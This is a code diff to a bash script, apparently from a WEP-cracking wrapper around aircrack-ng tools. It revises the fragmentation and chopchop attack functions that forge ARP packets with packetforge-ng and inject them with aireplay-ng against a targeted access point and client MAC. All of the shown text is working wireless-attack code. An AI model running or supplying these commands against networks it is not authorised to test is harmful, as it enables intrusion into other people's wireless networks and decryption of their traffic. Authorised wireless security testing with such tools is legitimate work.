@@ -31,7 +31,7 @@ othersinjectmenu(){
 
 injectmenu(){
     while true; do
-        ls -lah $DUMP_PATH/fragment-*.xor &>/dev/null
+        ls -lah $DUMP_PATH/*.xor &>/dev/null
         [[ $? != 0 ]] && { warn  "${mark}Can't open fragmentation xor files. Returning"; echo;  return; }
         if [ "$1" == "frag" ]; then
             if [ "$AUTO" == 1 ]; then
@@ -69,7 +69,7 @@ fragend(){
     if [ "$Host_MAC" = "" ]; then
         $clear && warn "${mark}ERROR: You must select a target first"
     else
-        $ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
+        $ARPFORGE -0 -a $Host_MAC -h $1 -k $Client_IP -l $Host_IP -y $DUMP_PATH/fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
         execute "Fragmentation without client" $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $1 -x $INJECTRATE $iwifi 
     fi
 }
@@ -78,10 +78,9 @@ chopchopend(){
     if [ "$Host_MAC" = "" ]; then
         $clear && warn "${mark}ERROR: You must select a target first"
     else
-        $ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
         rm -rf $DUMP_PATH/chopchop_$Host_MAC*
-        $ARPFORGE -0 -a $Host_MAC -h $1 -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
-        execute "ChopChop End" $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $1 -x $INJECTRATE $iwifi 
+        $ARPFORGE -0 -a $Host_MAC -h $1 -k $Client_IP -l $Host_IP -y $DUMP_PATH/replay*.xor -w $DUMP_PATH/chopchop_$Host_MAC.cap
+        AUTO=0; QUIET=""; execute "ChopChop End" $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $1 -x $INJECTRATE $iwifi 
     fi
 }
 
